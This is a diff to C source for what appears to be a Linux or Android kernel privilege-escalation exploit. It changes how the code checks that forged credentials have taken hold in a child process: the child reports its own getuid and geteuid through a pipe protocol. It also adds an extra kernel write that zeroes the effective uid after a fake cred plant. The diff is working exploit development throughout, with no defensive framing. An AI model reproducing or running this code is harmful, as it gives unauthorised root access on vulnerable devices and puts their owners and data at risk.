@@ -1010,6 +1010,25 @@ static int proc_real_uid(pid_t pid, unsigned long *uid_out)
     return 0;
 }
 
+/* Wake the blocked child and read its own getuid/geteuid.  Valid only in
+ * fake/diag/fullshell modes, where wait_child_main runs the peek protocol;
+ * this is the only way to see task->cred (the fake cred), because /proc
+ * reports real_cred. */
+static int poke_child(int go_fd, int st_fd, char cmd, int *uid, int *euid)
+{
+    int st[2];
+
+    if (write(go_fd, &cmd, 1) != 1)
+        return -1;
+    if (read(st_fd, st, sizeof(st)) != sizeof(st))
+        return -1;
+    if (uid)
+        *uid = st[0];
+    if (euid)
+        *euid = st[1];
+    return 0;
+}
+
 static int write_ksu_script(void)
 {
     static const char script[] =
@@ -1968,8 +1987,32 @@ static int wait_child_main(const char *mode)
     pin(g_cpu);
     if (write(4, &hello, sizeof(hello)) != sizeof(hello))
         _exit(130);
-    if (read(3, &ch, 1) != 1)
-        _exit(131);
+    {
+        /* Fake-cred modes: the parent cannot observe task->cred through
+         * /proc (status reports real_cred), so it peeks at the child's own
+         * view instead.  Every wake reports getuid/geteuid and the child
+         * only proceeds to the rest of this function on 'G'. */
+        int peek = !strcmp(mode, "fake") || !strcmp(mode, "diag") ||
+                   !strcmp(mode, "fullshell");
+
+        for (;;)
+        {
+            if (read(3, &ch, 1) != 1)
+                _exit(131);
+            if (!peek)
+                break;
+            {
+                int st[2];
+
+                st[0] = (int)syscall(SYS_getuid);
+                st[1] = (int)syscall(SYS_geteuid);
+                if (write(4, st, sizeof(st)) != sizeof(st))
+                    _exit(132);
+            }
+            if (ch == 'G')
+                break;
+        }
+    }
     close(3);
 
     memset(&rep, 0, sizeof(rep));
@@ -2331,8 +2374,8 @@ int main(int argc, char **argv)
         memset(&r, 0, sizeof(r));
         for (int a = 0; a < 8 && !verified; a++)
         {
-            unsigned long uid = ~0UL;
 
+            unsigned long uid = ~0UL;
             logf("[+] plant attempt %d/8\n", a + 1);
             memset(&r, 0, sizeof(r));
             run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
@@ -2451,7 +2494,6 @@ int main(int argc, char **argv)
 
         for (int a = 0; a < 8 && !planted; a++)
         {
-            unsigned long uid = ~0UL;
             int rc = stage_write_retry(g_child_task + OFF_TASK_CRED, 2,
                                        "fake_cred", raw, 1, &fc);
 
@@ -2459,11 +2501,16 @@ int main(int argc, char **argv)
                 park_forever("fake cred write failed");
             if (rc > 0)
                 continue;
-            if (!proc_real_uid(C, &uid) && uid != self_uid)
-                planted = 1;
-            else
-                logf("[!] fake cred plant missed (child uid=%lu); retrying\n",
-                     uid);
+            {
+                int cuid = -1, ceuid = -1;
+
+                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) &&
+                    (unsigned long)cuid != self_uid)
+                    planted = 1;
+                else
+                    logf("[!] fake cred plant missed (child uid=%d); retrying\n",
+                         cuid);
+            }
         }
         if (!planted)
         {
@@ -2499,7 +2546,7 @@ int main(int argc, char **argv)
 
             for (int a = 0; a < 8 && !fixed; a++)
             {
-                unsigned long uid = ~0UL;
+                int cuid = -1, ceuid = -1;
                 int rc = stage_write_retry(fc.A + CRED_UID_OFF, 0,
                                            "fake_uid", raw, 1, NULL);
 
@@ -2507,20 +2554,48 @@ int main(int argc, char **argv)
                     park_forever("fake uid fix held a zombie");
                 if (rc > 0)
                     continue;
-                if (!proc_real_uid(C, &uid) && uid == 0)
+                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && cuid == 0)
                     fixed = 1;
                 else
-                    logf("[!] fake uid write missed (uid=%lu); retrying\n", uid);
+                    logf("[!] fake uid write missed (uid=%d); retrying\n", cuid);
             }
             if (!fixed)
                 park_forever("fake uid fix failed");
+            /* The fake node rb_left overlaps cred+0x10 (sgid/euid on a build with a
+             * 4-byte usage), so euid still holds the high half of the target
+             * pointer.  Zero it too, or the child wakes with a bogus effective uid. */
+            for (int a = 0; a < 8; a++)
+            {
+                int cuid = -1, ceuid = -1;
+                int rc = stage_write_retry(fc.A + CRED_UID_OFF + 0x10, 0,
+                                           "fake_euid", raw, 1, NULL);
+
+                if (rc < 0)
+                    park_forever("fake euid fix held a zombie");
+                if (rc > 0)
+                    continue;
+                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && ceuid == 0)
+                    break;
+                if (a == 7)
+                    park_forever("fake euid fix failed");
+            }
         }
 
     }
     logf("[+] cred writes landed, waking child\n");
 
-    if (write(go_fd, "A", 1) != 1)
+    if (write(go_fd, g_fake_stage ? "G" : "A", 1) != 1)
         logf("[!] child wake write failed\n");
+    if (g_fake_stage)
+    {
+        /* G also produces one 8-byte peek reply; consume it, or it gets
+         * glued in front of the child report and the magic check fails. */
+        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
+        int st[2];
+
+        if (poll(&pf, 1, 2000) > 0)
+            (void)read(st_fd, st, sizeof(st));
+    }
     close(go_fd);
 
     {
